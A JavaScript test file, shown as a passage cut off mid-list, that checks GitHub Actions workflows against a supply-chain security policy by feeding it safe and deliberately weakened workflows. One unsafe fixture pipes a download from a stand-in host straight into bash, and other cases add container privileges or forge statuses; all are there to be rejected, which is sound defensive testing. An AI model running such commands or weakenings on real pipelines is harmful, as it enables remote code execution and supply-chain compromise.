import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { dump as dumpYaml, load as parseYaml } from 'js-yaml';
import { describe, expect, it } from 'vitest';
import {
  ATOMISTIC_DOCKERFILE_DIGESTS,
  ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST,
  ATOMISTIC_BOOTSTRAP_BASE_IMAGE,
  ATOMISTIC_BOOTSTRAP_QUARANTINE_PATH,
  ATOMISTIC_BOOTSTRAP_QUARANTINE_SHA256,
  ATOMISTIC_BOOTSTRAP_QUARANTINED_RUNNER_DIGEST,
  ATOMISTIC_BOOTSTRAP_SELECTED_RUNNER_DIGEST,
  ATOMISTIC_CONTAINER_OBSERVATION_WRITER_SHA256,
  ATOMISTIC_HISTORICAL_RUNTIME_DISCOVERY_LOCK_SHA256,
  ATOMISTIC_MATERIALIZATION_DIGEST,
  ATOMISTIC_BOOTSTRAP_NODE_VERSION,
  ATOMISTIC_BOOTSTRAP_OUTCOME_SCRIPT_SHA256,
  ATOMISTIC_RUNTIME_INVENTORY_VERIFIER_SHA256,
  ATOMISTIC_RUNTIME_INPUT_CONTRACT_SHA256,
  ATOMISTIC_CURRENT_RUNTIME_LOCK_SHA256,
  ATOMISTIC_RUNTIME_DISCOVERY_LOCK_SHA256,
  ATOMISTIC_RUNTIME_MATERIALIZATIONS,
  ATOMISTIC_RUNTIME_SOURCE_DATE_EPOCH,
  ATOMISTIC_RUNTIME_SOURCE_REVISION,
  ATOMISTIC_SELECTED_SOURCE_FILES,
  ATOMISTIC_SOURCE_MANIFEST_DIGEST,
  ATOMISTIC_BOOTSTRAP_PYPI_INDEX,
  ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX,
  ATOMISTIC_BOOTSTRAP_VERIFY_ATTEST_ACTION,
  ATOMISTIC_BOOTSTRAP_VERIFY_CHECKOUT_ACTION,
  ATOMISTIC_BOOTSTRAP_VERIFY_DOWNLOAD_ACTION,
  ATOMISTIC_BOOTSTRAP_VERIFY_NODE_VERSION,
  ATOMISTIC_BOOTSTRAP_VERIFY_RUN_DIGESTS,
  ATOMISTIC_BOOTSTRAP_VERIFY_SETUP_NODE_ACTION,
  ATOMISTIC_BOOTSTRAP_VERIFY_UPLOAD_ACTION,
  ATOMISTIC_BOOTSTRAP_VERIFY_WORKFLOW_PATH,
  ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
  DOCKERIGNORE_ALLOWLIST,
  FULL_CANDIDATE_REGISTRATION_WORKFLOW_NAME,
  FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
  FULL_CANDIDATE_REGISTRATION_WORKFLOW_SHA256,
  FULL_CANDIDATE_REGISTRATION_WORKFLOW_SIZE_BYTES,
  inspectAtomisticBootstrapQuarantineSource,
  inspectFullCandidateRegistrationWorkflow,
  inspectFullCandidateRegistrationWorkflowSource,
  inspectOpenMmTip3pProtectedWorkflow,
  inspectDockerfileSource,
  inspectDockerignoreSource,
  inspectWorkflowSource,
  PINNED_DOCKERFILE_FRONTEND,
  OPENMM_TIP3P_PROTECTED_RUN_DIGESTS,
  OPENMM_TIP3P_PROTECTED_WORKFLOW_PATH,
  OPENMM_TIP3P_PROTECTED_WORKFLOW_SHA256,
  PYTHON_HOSTLIST_BUILD_LOCK_SHA256,
  PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256,
  PYTHON_HOSTLIST_SDIST_SHA256,
  PYTHON_HOSTLIST_SDIST_URL,
  PYTHON_HOSTLIST_VERIFIER_SHA256,
  SENTINEL_EVALUATION_WORKFLOW_PATH,
  SENTINEL_EVALUATION_WORKFLOW_SHA256,
  SENTINEL_REPORT_WORKFLOW_PATH,
  SETUPTOOLS_RUNTIME_WHEEL_FILENAME,
  SETUPTOOLS_RUNTIME_WHEEL_SHA256,
  SETUPTOOLS_STARTUP_HOOK_SHA256,
} from './workflow-policy.mjs';
import { FULL_CANDIDATE_PRODUCER_WORKFLOW } from './atomistic/full-candidate-github-evidence-policy.mjs';

const atomisticBootstrapSource = readFileSync(
  new URL('../.github/workflows/atomistic-bootstrap.yml', import.meta.url),
  'utf8',
);
const atomisticBootstrapVerifySource = readFileSync(
  new URL('../.github/workflows/atomistic-bootstrap-verify.yml', import.meta.url),
  'utf8',
);
const openMmTip3pProtectedSource = readFileSync(
  new URL('../.github/workflows/openmm-tip3p-protected.yml', import.meta.url),
  'utf8',
);
const fullCandidateRegistrationSource = readFileSync(
  new URL('../.github/workflows/atomistic-full-candidate.yml', import.meta.url),
  'utf8',
);
const atomisticBootstrapQuarantineSource = readFileSync(
  new URL('../evaluation/atomistic/bootstrap-quarantine.json', import.meta.url),
);
const atomisticRuntimeLockSource = readFileSync(
  new URL('../evaluation/atomistic/runtime-lock.json', import.meta.url),
);
const checkedInDockerignoreSource = readFileSync(
  new URL('../.dockerignore', import.meta.url),
  'utf8',
);
const sentinelEvaluationSource = readFileSync(
  new URL('../.github/workflows/evaluate.yml', import.meta.url),
  'utf8',
);
const sentinelReportSource = readFileSync(
  new URL('../.github/workflows/sentinel-report.yml', import.meta.url),
  'utf8',
);
const pythonHostlistBuildLockSource = readFileSync(
  new URL('../atomistic/locks/python-hostlist-build.requirements.lock', import.meta.url),
);
const pythonHostlistBuildScriptSource = readFileSync(
  new URL('./atomistic/build_python_hostlist_wheel.sh', import.meta.url),
);
const pythonHostlistVerifierSource = readFileSync(
  new URL('./atomistic/verify_derived_wheel.py', import.meta.url),
);
const atomisticResolveLockSource = readFileSync(
  new URL('./atomistic/resolve_lock.py', import.meta.url),
  'utf8',
);
const runtimeInventoryVerifierSource = readFileSync(
  new URL('./atomistic/verify_runtime_inventory.py', import.meta.url),
);
const runtimeInputContractSource = readFileSync(
  new URL('./atomistic/runtime-input-contract.mjs', import.meta.url),
);
const containerObservationWriterSource = readFileSync(
  new URL('./atomistic/write-container-observation.mjs', import.meta.url),
);
const matterSimBootstrapInput = readFileSync(
  new URL('../atomistic/locks/mattersim.bootstrap.in', import.meta.url),
  'utf8',
);
const maceBootstrapInput = readFileSync(
  new URL('../atomistic/locks/mace.bootstrap.in', import.meta.url),
  'utf8',
);
const matterSimDockerfileSource = readFileSync(
  new URL('../atomistic/containers/mattersim.Dockerfile', import.meta.url),
  'utf8',
);
const maceDockerfileSource = readFileSync(
  new URL('../atomistic/containers/mace.Dockerfile', import.meta.url),
  'utf8',
);
const openMmWaterDockerfileSource = readFileSync(
  new URL('../atomistic/containers/openmm-water.Dockerfile', import.meta.url),
  'utf8',
);
const bootstrapOutcomeSource = readFileSync(
  new URL('./atomistic/write_bootstrap_outcome.py', import.meta.url),
);
const sentinelEvaluationWorkflow = parseYaml(sentinelEvaluationSource);
const sentinelReportWorkflow = parseYaml(sentinelReportSource);

function inspectMutatedBootstrap(mutator) {
  const workflow = parseYaml(atomisticBootstrapSource);
  mutator(workflow);
  return inspectWorkflowSource(
    ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
    dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
  );
}

function inspectMutatedBootstrapVerifier(mutator) {
  const workflow = parseYaml(atomisticBootstrapVerifySource);
  mutator(workflow);
  return inspectWorkflowSource(
    ATOMISTIC_BOOTSTRAP_VERIFY_WORKFLOW_PATH,
    dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
  );
}

function inspectMutatedOpenMmProtected(mutator, { semanticOnly = false } = {}) {
  const workflow = parseYaml(openMmTip3pProtectedSource);
  mutator(workflow);
  if (semanticOnly) return inspectOpenMmTip3pProtectedWorkflow(workflow);
  return inspectWorkflowSource(
    OPENMM_TIP3P_PROTECTED_WORKFLOW_PATH,
    dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
  );
}

function inspectMutatedFullCandidateRegistration(mutator) {
  const workflow = parseYaml(fullCandidateRegistrationSource);
  mutator(workflow);
  return inspectFullCandidateRegistrationWorkflow(
    workflow,
    fullCandidateRegistrationSource,
  );
}

function protectedStep(workflow, jobName, name) {
  const matches = workflow.jobs[jobName].steps.filter((step) => step.name === name);
  if (matches.length !== 1) throw new Error(`expected one ${jobName} step named ${name}`);
  return matches[0];
}

function namedStep(workflow, name) {
  const matches = workflow.jobs.bootstrap.steps.filter((step) => step.name === name);
  if (matches.length !== 1) throw new Error(`expected one bootstrap step named ${name}`);
  return matches[0];
}

describe('workflow source policy', () => {
  it('accepts full action and OCI pins plus credential-free checkout', () => {
    const source = `on: [push]\njobs:\n  test:\n    container: node@sha256:${'b'.repeat(64)}\n    services:\n      db:\n        image: postgres@sha256:${'c'.repeat(64)}\n    steps:\n      - uses: actions/checkout@${'a'.repeat(40)} # v4\n        with:\n          persist-credentials: false\n      - uses: docker://example/tool@sha256:${'d'.repeat(64)}\n      - uses: ./local-action\n`;
    expect(inspectWorkflowSource('safe.yml', source)).toEqual([]);
  });

  it('rejects mutable refs, images, pull_request_target, credentials and network-to-shell', () => {
    const failures = inspectWorkflowSource('unsafe.yml', `on:\n  pull_request_target:\njobs:\n  x:\n    container: ubuntu:latest\n    services:\n      db:\n        image: postgres:latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: docker://evil.example/tool:latest\n      - run: curl https://example.invalid/x | bash\n`);
    expect(failures).toHaveLength(7);
    expect(failures.join('\n')).toMatch(/Docker action.*not pinned/);
  });

  it('rejects duplicate YAML keys instead of accepting last-wins parsing', () => {
    expect(inspectWorkflowSource('duplicate.yml', 'on: push\non: pull_request\njobs: {}').join('\n')).toMatch(/duplicate keys/);
  });

  it('keeps candidate evaluation read-only and moves PR writes to the default-branch workflow_run reporter', () => {
    expect(inspectWorkflowSource(SENTINEL_EVALUATION_WORKFLOW_PATH, sentinelEvaluationSource)).toEqual([]);
    expect(createHash('sha256').update(sentinelEvaluationSource).digest('hex'))
      .toBe(SENTINEL_EVALUATION_WORKFLOW_SHA256);
    expect(inspectWorkflowSource(SENTINEL_REPORT_WORKFLOW_PATH, sentinelReportSource)).toEqual([]);
    expect(sentinelEvaluationWorkflow.permissions).toEqual({ contents: 'read' });
    expect(Object.keys(sentinelEvaluationWorkflow.jobs)).toEqual(['evaluate']);
    expect(sentinelEvaluationWorkflow.jobs.evaluate.permissions).toEqual({ contents: 'read' });
    expect(sentinelEvaluationWorkflow.jobs.evaluate['runs-on']).toBe('ubuntu-24.04');
    expect(sentinelEvaluationWorkflow.jobs.evaluate['timeout-minutes']).toBe(35);
    const evaluationCheckout = sentinelEvaluationWorkflow.jobs.evaluate.steps.find((step) => step.uses?.startsWith('actions/checkout@'));
    expect(evaluationCheckout?.with).toEqual({ 'persist-credentials': false, 'fetch-depth': 0 });
    const pythonSetup = sentinelEvaluationWorkflow.jobs.evaluate.steps.find(
      (step) => step.uses?.startsWith('actions/setup-python@'),
    );
    expect(pythonSetup).toEqual({
      uses: 'actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065',
      with: { 'python-version': '3.12.11' },
    });
    expect(sentinelReportWorkflow.on).toEqual({
      workflow_run: {
        workflows: ['Tailing Sentinel'],
        types: ['completed'],
      },
    });
    expect(sentinelReportWorkflow.permissions).toEqual({
      actions: 'read',
      'pull-requests': 'write',
    });
    expect(sentinelReportWorkflow.jobs.report.permissions).toEqual({
      actions: 'read',
      'pull-requests': 'write',
    });
    expect(sentinelReportWorkflow.jobs.report['runs-on']).toBe('ubuntu-24.04');
    expect(sentinelReportWorkflow.jobs.report.steps.some((step) => step.run
      || String(step.uses ?? '').startsWith('actions/checkout@')
      || String(step.uses ?? '').startsWith('./'))).toBe(false);
    expect(sentinelReportWorkflow.jobs.report.steps.every((step) =>
      /^actions\/github-script@[0-9a-f]{40}$/.test(step.uses))).toBe(true);
    for (const stepId of ['build', 'report_build']) {
      const buildStep = sentinelEvaluationWorkflow.jobs.evaluate.steps.find((step) => step.id === stepId);
      expect(buildStep?.env).toEqual({
        NEXT_PUBLIC_TAILING_COMMIT_SHA: '${{ github.sha }}',
      });
    }
  });

  it('rejects every candidate-workflow attempt to acquire write authority', () => {
    const cases = [
      ['top-level pull-request write', (workflow) => { workflow.permissions['pull-requests'] = 'write'; }],
      ['evaluate-job pull-request write', (workflow) => { workflow.jobs.evaluate.permissions['pull-requests'] = 'write'; }],
      ['OIDC write', (workflow) => { workflow.jobs.evaluate.permissions['id-token'] = 'write'; }],
      ['privileged sibling job', (workflow) => {
        workflow.jobs.report = {
          permissions: { 'pull-requests': 'write' },
          'runs-on': 'ubuntu-24.04',
          steps: [],
        };
      }],
      ['target-context trigger', (workflow) => { workflow.on = { pull_request_target: null }; }],
      ['shallow ancestor checkout', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.uses?.startsWith('actions/checkout@')).with['fetch-depth'] = 1;
      }],
      ['timeout shortened', (workflow) => { workflow.jobs.evaluate['timeout-minutes'] = 1; }],
      ['Python runtime drift', (workflow) => {
        workflow.jobs.evaluate.steps.find(
          (step) => step.uses?.startsWith('actions/setup-python@'),
        ).with['python-version'] = '3.13';
      }],
      ['lint bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'lint').run = 'true';
      }],
      ['typecheck bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'typecheck').run = 'true';
      }],
      ['full tests bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'test').run = 'true';
      }],
      ['build bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'build').run = 'true';
      }],
      ['audit bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'audit').run = 'true';
      }],
      ['release manifest bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'release_manifest').run = 'true';
      }],
      ['Sentinel test status removed', (workflow) => {
        delete workflow.jobs.evaluate.steps.find((step) => step.id === 'sentinel')
          .env.TAILING_TEST_STATUS;
      }],
      ['final test status removed', (workflow) => {
        delete workflow.jobs.evaluate.steps.at(-1).env.TEST_STATUS;
      }],
      ['gate steps reordered', (workflow) => {
        const steps = workflow.jobs.evaluate.steps;
        [steps[3], steps[4]] = [steps[4], steps[3]];
      }],
      ['atomistic runtime-lock gate removed', (workflow) => {
        const steps = workflow.jobs.evaluate.steps;
        steps.splice(steps.findIndex((step) => step.id === 'atomistic_manifest'), 1);
      }],
      ['atomistic validator bypassed', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'atomistic_manifest').run = 'true';
      }],
      ['Sentinel atomistic status forged', (workflow) => {
        workflow.jobs.evaluate.steps.find((step) => step.id === 'sentinel').env.TAILING_ATOMISTIC_MANIFEST_STATUS = '${{ steps.install.outcome }}';
      }],
      ['final atomistic status forged', (workflow) => {
        workflow.jobs.evaluate.steps.at(-1).env.ATOMISTIC_MANIFEST_STATUS = '${{ steps.install.outcome }}';
      }],
    ];
    for (const [label, mutate] of cases) {
      const workflow = parseYaml(sentinelEvaluationSource);
      mutate(workflow);
      expect(inspectWorkflowSource(
        SENTINEL_EVALUATION_WORKFLOW_PATH,
        dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
      ), label).not.toEqual([]);
    }
  });

  it('rejects reporter trust-binding, bounded-data, and no-candidate-execution drift', () => {
    const cases = [
      ['source workflow name', (workflow) => { workflow.on.workflow_run.workflows = ['Candidate Sentinel']; }],
      ['write scope expansion', (workflow) => { workflow.permissions.contents = 'write'; }],
      ['mutable runner', (workflow) => { workflow.jobs.report['runs-on'] = 'ubuntu-latest'; }],
      ['candidate checkout', (workflow) => {
        workflow.jobs.report.steps.splice(1, 0, {
          name: 'Checkout candidate',
          uses: `actions/checkout@${'a'.repeat(40)}`,
          with: { ref: '${{ github.event.workflow_run.head_sha }}', 'persist-credentials': false },
        });
      }],
      ['candidate shell', (workflow) => {
        workflow.jobs.report.steps.push({ name: 'Run candidate', run: 'node candidate.mjs' });
      }],
      ['workflow id drift', (workflow) => {
        workflow.jobs.report.steps[0].env.EXPECTED_WORKFLOW_ID = '1';
      }],
      ['repository id drift', (workflow) => {
        workflow.jobs.report.steps[0].env.EXPECTED_REPOSITORY_ID = '1';
      }],
      ['artifact size expansion', (workflow) => {
        workflow.jobs.report.steps[1].env.MAX_ARTIFACT_ARCHIVE_BYTES = '1073741824';
      }],
      ['report size expansion', (workflow) => {
        workflow.jobs.report.steps[1].env.MAX_REPORT_BYTES = '1073741824';
      }],
      ['artifact-name validation removal', (workflow) => {
        workflow.jobs.report.steps[0].with.script = workflow.jobs.report.steps[0].with.script
          .replace("assert(matches.length === 1, 'expected report artifact name must resolve exactly once');", '');
      }],
      ['mention neutralization removal', (workflow) => {
        workflow.jobs.report.steps[1].with.script = workflow.jobs.report.steps[1].with.script
          .replace(".replaceAll('@', '@\\u200b');", ".replaceAll('@', '@');");
      }],
      ['ZIP expansion guard removal', (workflow) => {
        workflow.jobs.report.steps[1].with.script = workflow.jobs.report.steps[1].with.script
          .replace('expandedSize > 0 && expandedSize <= maxReportBytes', 'expandedSize > 0');
      }],
    ];
    for (const [label, mutate] of cases) {
      const workflow = parseYaml(sentinelReportSource);
      mutate(workflow);
      expect(inspectWorkflowSource(
        SENTINEL_REPORT_WORKFLOW_PATH,
        dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
      ), label).not.toEqual([]);
    }
  });

  it('compiles both reviewed reporter programs as asynchronous JavaScript', () => {
    const AsyncFunction = Object.getPrototypeOf(async function noop() {}).constructor;
    for (const step of sentinelReportWorkflow.jobs.report.steps) {
      expect(() => new AsyncFunction('github', 'context', 'core', 'require', step.with.script)).not.toThrow();
    }
  });
});

describe('atomistic bootstrap replica verifier workflow policy', () => {
  it('accepts the checked-in protected-main read-only verifier and isolated receipt attestation', () => {
    expect(inspectWorkflowSource(
      ATOMISTIC_BOOTSTRAP_VERIFY_WORKFLOW_PATH,
      atomisticBootstrapVerifySource,
    )).toEqual([]);
    const workflow = parseYaml(atomisticBootstrapVerifySource);
    expect(workflow.on).toEqual({
      workflow_dispatch: {
        inputs: {
          run_id_1: {
            description: 'First approved bootstrap workflow run ID',
            required: true,
            type: 'string',
          },
          run_id_2: {
            description: 'Second approved bootstrap workflow run ID',
            required: true,
            type: 'string',
          },
        },
      },
    });
    expect(workflow.permissions).toEqual({ contents: 'read', actions: 'read' });
    expect(workflow.jobs.verify.permissions).toEqual({ contents: 'read', actions: 'read' });
    expect(workflow.jobs.attest.permissions).toEqual({
      contents: 'read',
      actions: 'read',
      'id-token': 'write',
      attestations: 'write',
      'artifact-metadata': 'write',
    });
    expect(workflow.jobs.verify['runs-on']).toBe('ubuntu-24.04');
    expect(workflow.jobs.attest['runs-on']).toBe('ubuntu-24.04');
    expect(workflow.jobs.attest.needs).toBe('verify');
    expect(workflow.jobs.attest.steps.some((step) => String(step.uses ?? '').startsWith('actions/checkout@'))).toBe(false);
    expect(workflow.jobs.attest.steps.some((step) => String(step.uses ?? '').startsWith('./'))).toBe(false);
    expect(workflow.jobs.attest.steps.some((step) => typeof step.run === 'string' && /(?:^|[\s"'])scripts\//m.test(step.run))).toBe(false);
    expect(ATOMISTIC_BOOTSTRAP_VERIFY_CHECKOUT_ACTION).toBe('actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803');
    expect(ATOMISTIC_BOOTSTRAP_VERIFY_SETUP_NODE_ACTION).toBe('actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38');
    expect(ATOMISTIC_BOOTSTRAP_VERIFY_UPLOAD_ACTION).toBe('actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02');
    expect(ATOMISTIC_BOOTSTRAP_VERIFY_DOWNLOAD_ACTION).toBe('actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0');
    expect(ATOMISTIC_BOOTSTRAP_VERIFY_ATTEST_ACTION).toBe('actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6');
    expect(ATOMISTIC_BOOTSTRAP_VERIFY_NODE_VERSION).toBe('24.16.0');
    for (const digest of Object.values(ATOMISTIC_BOOTSTRAP_VERIFY_RUN_DIGESTS)) {
      expect(digest).toMatch(/^sha256:[0-9a-f]{64}$/);
    }
  });

  it('rejects trigger, required-input, runner, permission, and job-separation drift', () => {
    const cases = [
      ['push trigger', (workflow) => { workflow.on.push = null; }],
      ['pull request trigger', (workflow) => { workflow.on.pull_request = null; }],
      ['first input optional', (workflow) => { workflow.on.workflow_dispatch.inputs.run_id_1.required = false; }],
      ['second input optional', (workflow) => { workflow.on.workflow_dispatch.inputs.run_id_2.required = false; }],
      ['non-string input', (workflow) => { workflow.on.workflow_dispatch.inputs.run_id_1.type = 'number'; }],
      ['verify runner drift', (workflow) => { workflow.jobs.verify['runs-on'] = 'ubuntu-latest'; }],
      ['attest runner drift', (workflow) => { workflow.jobs.attest['runs-on'] = 'ubuntu-latest'; }],
      ['workflow write expansion', (workflow) => { workflow.permissions.contents = 'write'; }],
      ['OIDC in verify', (workflow) => { workflow.jobs.verify.permissions['id-token'] = 'write'; }],
      ['attest contents write', (workflow) => { workflow.jobs.attest.permissions.contents = 'write'; }],
      ['attest no longer needs verify', (workflow) => { delete workflow.jobs.attest.needs; }],
      ['unreviewed sibling job', (workflow) => {
        workflow.jobs.publish = { 'runs-on': 'ubuntu-24.04', permissions: { contents: 'write' }, steps: [] };
      }],
      ['attestation moved into verify', (workflow) => {
        workflow.jobs.verify.steps.push(workflow.jobs.attest.steps.pop());
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrapVerifier(mutate), label).not.toEqual([]);
    }
  });

  it('rejects floating actions, checkout/ancestry drift, action order, and reviewed body changes', () => {
    const cases = [
      ['floating attest tag', (workflow) => { workflow.jobs.attest.steps[3].uses = 'actions/attest@v4'; }],
      ['floating download tag', (workflow) => { workflow.jobs.attest.steps[1].uses = 'actions/download-artifact@v5'; }],
      ['floating checkout tag', (workflow) => { workflow.jobs.verify.steps[0].uses = 'actions/checkout@v6'; }],
      ['checkout revision drift', (workflow) => { workflow.jobs.verify.steps[0].with.ref = '${{ github.ref }}'; }],
      ['shallow checkout', (workflow) => { workflow.jobs.verify.steps[0].with['fetch-depth'] = 1; }],
      ['protected-ref guard removed', (workflow) => {
        workflow.jobs.verify.steps[2].run = workflow.jobs.verify.steps[2].run.replace('test "$GITHUB_REF_PROTECTED" = "true"\n', '');
      }],
      ['main ancestry check removed', (workflow) => {
        workflow.jobs.verify.steps[2].run = workflow.jobs.verify.steps[2].run.replace('git merge-base --is-ancestor "$GITHUB_SHA" refs/remotes/origin/main\n', '');
      }],
      ['approved run changed', (workflow) => {
        workflow.jobs.verify.steps[2].run = workflow.jobs.verify.steps[2].run.replace('33242996794', '33242996795');
      }],
      ['lifecycle scripts enabled', (workflow) => {
        workflow.jobs.verify.steps[3].run = workflow.jobs.verify.steps[3].run.replace(' --ignore-scripts', '');
      }],
      ['verifier invocation body drift', (workflow) => {
        workflow.jobs.verify.steps[4].run = workflow.jobs.verify.steps[4].run.replace('--run-id-2 "$RUN_ID_2"', '--run-id-2 "33242996794"');
      }],
      ['attest validation body drift', (workflow) => {
        workflow.jobs.attest.steps[2].run = workflow.jobs.attest.steps[2].run.replace('entries.length !== 1', 'entries.length < 2');
      }],
      ['attest action before byte validation', (workflow) => {
        [workflow.jobs.attest.steps[2], workflow.jobs.attest.steps[3]] = [workflow.jobs.attest.steps[3], workflow.jobs.attest.steps[2]];
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrapVerifier(mutate), label).not.toEqual([]);
    }
  });

  it('rejects checkout or repository execution in the privileged attest job', () => {
    const cases = [
      ['checkout in attest', (workflow) => {
        workflow.jobs.attest.steps.splice(3, 0, {
          name: 'Check out repository in privileged job',
          uses: ATOMISTIC_BOOTSTRAP_VERIFY_CHECKOUT_ACTION,
          with: { 'persist-credentials': false, 'fetch-depth': 0 },
        });
      }],
      ['repository script before attest', (workflow) => {
        workflow.jobs.attest.steps.splice(3, 0, {
          name: 'Execute repository code before attest',
          shell: 'bash',
          run: 'node scripts/atomistic/verify-bootstrap-replicas.mjs',
        });
      }],
      ['local action before attest', (workflow) => {
        workflow.jobs.attest.steps.splice(3, 0, { name: 'Local action', uses: './.github/actions/local' });
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrapVerifier(mutate).join('\n'), label).toMatch(/attest/);
    }
  });

  it('rejects receipt artifact-name, path, digest, size, and current-run binding drift', () => {
    const cases = [
      ['upload artifact name', (workflow) => { workflow.jobs.verify.steps[5].with.name = 'unbound-receipt'; }],
      ['receipt producer artifact name', (workflow) => { workflow.jobs.verify.steps[4].env.RECEIPT_ARTIFACT_NAME = 'unbound-receipt'; }],
      ['download artifact name', (workflow) => { workflow.jobs.attest.steps[1].with.name = 'unbound-receipt'; }],
      ['different source run download', (workflow) => { workflow.jobs.attest.steps[1].with['run-id'] = '33242996794'; }],
      ['broader receipt upload path', (workflow) => { workflow.jobs.verify.steps[5].with.path = '${{ runner.temp }}'; }],
      ['receipt size output forged', (workflow) => { workflow.jobs.verify.outputs.receipt_size_bytes = '1'; }],
      ['receipt digest input forged', (workflow) => { workflow.jobs.attest.steps[2].env.EXPECTED_RECEIPT_SHA256 = `sha256:${'0'.repeat(64)}`; }],
      ['attested path drift', (workflow) => { workflow.jobs.attest.steps[3].with['subject-path'] = '${{ runner.temp }}/other.json'; }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrapVerifier(mutate), label).not.toEqual([]);
    }
  });
});

describe('protected OpenMM TIP3P workflow policy', () => {
  it('accepts only the reviewed protected-main execution and isolated envelope attestation', () => {
    expect(inspectWorkflowSource(
      OPENMM_TIP3P_PROTECTED_WORKFLOW_PATH,
      openMmTip3pProtectedSource,
    )).toEqual([]);
    expect(createHash('sha256').update(openMmTip3pProtectedSource).digest('hex'))
      .toBe(OPENMM_TIP3P_PROTECTED_WORKFLOW_SHA256);
    const workflow = parseYaml(openMmTip3pProtectedSource);
    expect(Object.keys(workflow.jobs)).toEqual(['execute', 'attest']);
    expect(workflow.jobs.execute['timeout-minutes']).toBe(350);
    expect(workflow.jobs.attest.needs).toBe('execute');
    expect(workflow.jobs.attest.steps.some(
      (step) => String(step.uses ?? '').startsWith('actions/checkout@'),
    )).toBe(false);
    const upload = protectedStep(
      workflow, 'execute', 'Upload only the allowlisted protected-CI evidence',
    );
    expect(upload.with.path.trim().split('\n')).toHaveLength(9);
    expect(upload.with.path).toContain('openmm-tip3p-protected-browser-evidence.json');
    expect(upload.with.path).not.toMatch(/PRODUCER_OUTPUT|INPUT_ROOT|WHEELHOUSE|\.pdb|\.xml|arrays\//);
    for (const digest of Object.values(OPENMM_TIP3P_PROTECTED_RUN_DIGESTS)) {
      expect(digest).toMatch(/^sha256:[0-9a-f]{64}$/);
    }
  });

  it('rejects security, science gate, publication, provenance, and privilege drift semantically', () => {
    const cases = [
      ['automatic push trigger', (workflow) => { workflow.on.push = null; }],
      ['root write authority', (workflow) => { workflow.permissions.contents = 'write'; }],
      ['shortened execution bound', (workflow) => { workflow.jobs.execute['timeout-minutes'] = 30; }],
      ['base index substitution', (workflow) => {
        workflow.jobs.execute.env.BASE_IMAGE_INDEX_DIGEST = `sha256:${'0'.repeat(64)}`;
      }],
      ['protected-ref guard removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Refuse dispatch outside protected main Linux x86_64');
        step.run = step.run.replace('test "$GITHUB_REF_PROTECTED" = "true"\n', '');
      }],
      ['first-attempt guard removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Refuse dispatch outside protected main Linux x86_64');
        step.run = step.run.replace('test "$GITHUB_RUN_ATTEMPT" = "1"\n', '');
      }],
      ['Chromium acquisition substitution', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Acquire the exact locked private Chromium archive');
        step.run = step.run.replace('fetch-private-chromium-v049.mjs', 'unlocked-fetch.mjs');
      }],
      ['Chromium safe extraction removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Safely extract the exact locked private Chromium runtime');
        step.run = step.run.replace('safe_extract_private_chromium_v049.py', 'unzip');
      }],
      ['Chromium freeze removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Freeze and verify the exact locked private Chromium runtime');
        step.run = step.run.replace('freeze-private-chromium-runtime-v049.py', 'true');
      }],
      ['Rolldown binding digest drift', (workflow) => {
        const step = protectedStep(
          workflow, 'execute', 'Freeze the exact Node and Rolldown browser runtime dependencies',
        );
        step.run = step.run.replace(
          'ae16856655924ebc41f231393c7f8b89566430a845d1f073fd9d6abf219db04b',
          '0'.repeat(64),
        );
      }],
      ['index-child verification removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Prefetch the pinned base image and record the Docker toolchain');
        step.run = step.run.replace('docker buildx imagetools inspect "$BASE_IMAGE_INDEX" --raw', 'true');
      }],
      ['networked image build', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Build the OpenMM image with build-step network disabled');
        step.run = step.run.replace('--network none', '--network default');
      }],
      ['container capability expansion', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Create the hardened offline producer container');
        step.run = step.run.replace('--cap-drop ALL', '--cap-add SYS_ADMIN');
      }],
      ['independent verifier removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Independently verify the complete private producer output');
        step.run = step.run.replace('verify-control-cli.mjs', 'producer.py');
      }],
      ['verified-pass gate removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Require the exact independently verified-pass receipt');
        step.run = step.run.replace("receipt.status !== 'verified-pass'", 'false');
      }],
      ['browser source freeze removal', (workflow) => {
        const step = protectedStep(
          workflow, 'execute',
          'Freeze the verified OpenMM source and control receipt for private browser modes',
        );
        step.run = step.run.replace('sudo chmod 0555 -- "$BROWSER_CONTROL_ROOT"', 'true');
      }],
